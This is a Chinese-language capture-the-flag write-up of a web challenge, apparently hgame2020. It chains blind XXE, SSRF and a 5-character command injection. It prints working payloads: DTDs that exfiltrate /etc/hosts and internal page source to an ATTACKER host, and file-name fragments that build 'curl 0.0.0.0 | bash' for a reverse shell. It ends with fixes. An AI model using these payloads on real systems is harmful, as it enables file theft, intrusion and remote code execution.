# 代打出题人服务中心

## 题目简述

外网入口接收 XML，但没有直接回显。利用 Blind XXE 可以把文件内容带到攻击者服务器；读取 `/etc/hosts` 后发现内网站点，再通过相同的 XXE 通道实施 SSRF。内网 PHP 只执行参数前 5 个字符，需要利用重定向、文件名和 `ls -t` 逐段拼出长命令，最终取得 shell 并寻找 flag。

## 解题过程

先在攻击者服务器提供 `xxe.dtd`：

```xml
<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
<!ENTITY % declare "<!ENTITY &#37; exfil SYSTEM 'http://ATTACKER:5555/?p=%payload;'>">
```

提交到题目入口的 XML 为：

```xml
<!DOCTYPE convert [
  <!ENTITY % remote SYSTEM "http://ATTACKER/xxe.dtd">
  %remote;
  %declare;
  %exfil;
]>
```

外部参数实体加载 DTD 后，`%payload;` 读取并 Base64 编码 `/etc/hosts`，`%exfil;` 再向监听端发出请求。解码结果中出现内网 Web 地址。PDF 正文写作 `172.20.0.76`，完整脚本则使用 `172.21.0.76`；复现时必须以目标 `/etc/hosts` 的实际值为准。

内网页面较大，libxml 直接把整页塞进实体可能失败。先压缩再编码：

```xml
<!ENTITY % payload SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=http://172.20.0.76/">
<!ENTITY % declare "<!ENTITY &#37; exfil SYSTEM 'http://ATTACKER:5555/?p=%payload;'>">
```

本地依次做 URL 解码、Base64 解码和 raw DEFLATE 解压，即可恢复源码。关键逻辑是：

```php
$sandbox = '/var/www/html/sandbox/' . md5('hgame2020' . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);

$content = @$_GET['v'];
if (isset($content)) {
    $cmd = substr($content, 0, 5);
    system($cmd);
} elseif (isset($_GET['r'])) {
    system('rm -rf ./*');
}
```

虽然单次最多执行 5 个字符，但 shell 重定向可以创建“文件名即命令片段”的空文件。例如下面每行都不超过限制，按顺序建立文件后，`ls -t` 会按创建时间倒序输出它们：

```text
>ls\
ls>_
>\ \
>-t\
>\>a
ls>>_
```

执行 `sh _` 后，文件 `_` 中形成 `ls -t>a`。继续以相同方式创建带反斜线的片段，使 `ls -t` 的输出拼成多行 shell 语句，例如：

```text
cu\
rl\
␠\
0.\
0.\
0.\
0\
|\
bash
```

其中 `␠` 表示一个字面空格；它只是为避免 Markdown 行尾空白而使用的可视化记号，实际文件名片段仍是“空格加反斜线”。

执行生成脚本后等价于：

```bash
curl 0.0.0.0 | bash
```

让该 URL 返回受控的反向 shell 脚本，取得内网沙箱 shell 后使用 `find` 定位 flag。整条利用应通过 Blind XXE 触发 SSRF：攻击者先更新 DTD 中的 `resource=` 为带 `token` 和 `v` 参数的内网 URL，再提交外层 XML，每次只投递一个 5 字符片段。

## 方法总结

- 完整链路：Blind XXE 外带文件、`/etc/hosts` 发现内网、XXE 转 SSRF、PHP filter 压缩回传、5 字符命令拼接。
- 关键技巧：文件名可以保存任意短片段，`ls -t` 提供可控顺序，反斜线把多行重新连接成一条命令。
- 修复方向：禁用 XML 外部实体与网络访问、对 SSRF 使用严格目的地址策略，并彻底避免把用户字符串交给 `system`；截断命令长度不是安全边界。
